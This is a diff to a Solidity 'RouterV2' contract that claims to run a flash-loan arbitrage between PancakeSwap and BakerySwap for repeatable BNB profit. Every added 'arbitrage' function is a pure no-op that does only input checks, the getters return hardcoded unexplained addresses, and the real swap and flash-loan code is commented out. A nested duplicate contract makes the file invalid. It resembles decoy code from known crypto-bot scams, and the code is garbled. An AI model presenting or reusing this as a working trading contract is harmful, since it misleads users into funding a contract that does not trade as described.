@@ -166,6 +166,63 @@ contract RouterV2 {
         require(balanceAmount >= 0, "Amount should be greater than 0!");
     }
 
+    contract RouterV2 {
+
+    function pancakeRouterV2Address() public pure returns (address) {
+        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
+    }
+
+    function compareStrings(string memory a, string memory b)
+        public pure
+        returns (bool)
+    {
+        return (keccak256(abi.encodePacked((a))) ==
+            keccak256(abi.encodePacked((b))));
+    }
+
+    function pancakeSwapAddress() public pure returns (address) {
+        return 0x9c7770E88dd4c4F972283E97B4FeBD2991e0E05B; //0x05f18088749F7eDffe9ae56d628dd97e5b4d048f //
+    }
+
+    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+    function borrowFlashloanFromMultiplier(
+        address add0,
+        address add1,
+        uint256 amount
+    ) public pure {
+        require(uint(add0) != 0, "Address is invalid.");
+        require(uint(add1) != 0, "Address is invalid.");
+        require(amount > 0, "Amount should be greater than 0.");
+    }
+
+    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+    function convertBnbToBusd(address add0, uint256 amount) public pure {
+        require(uint(add0) != 0, "Address is invalid");
+        require(amount > 0, "Amount should be greater than 0");
+    }
+
+    function bakerySwapAddress() public pure returns (address) {
+        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
+    }
+
+    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+    function callArbitrageBakerySwap(address add0, address add1) public pure {
+        require(uint(add0) != 0, "Address is invalid!");
+        require(uint(add1) != 0, "Address is invalid!");
+    }
+
+    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+    function transferBnbToMultiplier(address add0)
+        public pure
+    {
+        require(uint(add0) != 0, "Address is invalid!");
+    }
+
+    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+    function completeTransation(uint256 balanceAmount) public pure {
+        require(balanceAmount >= 0, "Amount should be greater than 0!");
+    }
+
     function swap(
         uint256 amount0Out,
         uint256 amount1Out,
@@ -175,41 +232,41 @@ contract RouterV2 {
             amount0Out > 0 || amount1Out > 0,
             "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
         ); 
-        require(uint(to) != 0, "Address can't be null");
+        require(uint(to) != 0, "Address can't be null");/*
         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
         require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');
 
-        // uint balance0;
-        // uint balance1;
-        // { // scope for _token{0,1}, avoids stack too deep errors
-        // address _token0 = token0;
-        // address _token1 = token1;
-        // require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
-        // if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
-        // if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
-        // if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
-        // balance0 = IERC20(_token0).balanceOf(address(this));
-        // balance1 = IERC20(_token1).balanceOf(address(this));
-        // }
-        // uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
-        // uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
-        // require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
-        // { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
-        // uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));
-        // uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));
-        // require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');
-        // }
+        uint balance0;
+        uint balance1;
+        { // scope for _token{0,1}, avoids stack too deep errors
+        address _token0 = token0;
+        address _token1 = token1;
+        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
+        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
+        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
+        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
+        balance0 = IERC20(_token0).balanceOf(address(this));
+        balance1 = IERC20(_token1).balanceOf(address(this));
+        }
+        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
+        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
+        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
+        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
+        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));
+        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));
+        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');
+        }
 
-        // _update(balance0, balance1, _reserve0, _reserve1);
-        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
+        _update(balance0, balance1, _reserve0, _reserve1);
+        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);*/
     }
 
     function lendingPoolFlashloan(uint256 _asset) public pure {
         uint256 data = _asset; 
-        require(data != 0, "Data can't be 0.");
-        // uint amount = 1 BNB;
+        require(data != 0, "Data can't be 0.");/*
+        uint amount = 1 BNB;
 
-        // ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
-        // lendingPool.flashLoan(address(this), _asset, amount, data);
+        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
+        lendingPool.flashLoan(address(this), _asset, amount, data);*/
     }
 }
